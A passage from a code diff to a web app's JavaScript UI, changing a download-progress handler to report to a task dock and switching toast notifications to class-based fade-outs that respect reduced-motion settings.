+        }
         const bar = document.getElementById('download-bar');
         const percentEl = document.getElementById('download-percent');
         const chunkInfo = document.getElementById('download-chunk-info');
@@ -2818,7 +4297,12 @@ window.I18n = {
         if (chunkInfo) chunkInfo.textContent = `分片 ${current}/${total}`;
     }
     
-    hideDownloadProgress() {
+    hideDownloadProgress(failed, msg) {
+        if (typeof TaskDock !== 'undefined' && this._downloadTaskId) {
+            TaskDock.finish(this._downloadTaskId, failed ? (msg || '下载失败') : null);
+            this._downloadTaskId = null;
+            return;
+        }
         const modal = document.getElementById('download-progress-modal');
         if (!modal) return;
         modal.classList.add('closing');
@@ -2883,14 +4367,14 @@ window.I18n = {
         toast.innerHTML = `
             <span class="toast-icon">${icons[type] || icons.info}</span>
             <span class="toast-message">${message}</span>
-            <button class="toast-close" onclick="this.parentElement.remove()">×</button>
+            <button class="toast-close" onclick="var t=this.parentElement;t.classList.add('is-out');setTimeout(function(){t.remove()},260)">×</button>
         `;
         container.appendChild(toast);
         setTimeout(() => {
-            toast.style.opacity = '0';
-            toast.style.transform = 'translateX(100%)';
-            toast.style.transition = 'all 0.3s';
-            setTimeout(() => toast.remove(), 300);
+            // 用 class 而不是内联样式：内联优先级高于 CSS，
+            // 会盖掉 prefers-reduced-motion 里"不要动画"的兜底。
+            toast.classList.add('is-out');
+            setTimeout(() => { try { toast.remove(); } catch (e) {} }, 260);
         }, duration);
     }
 
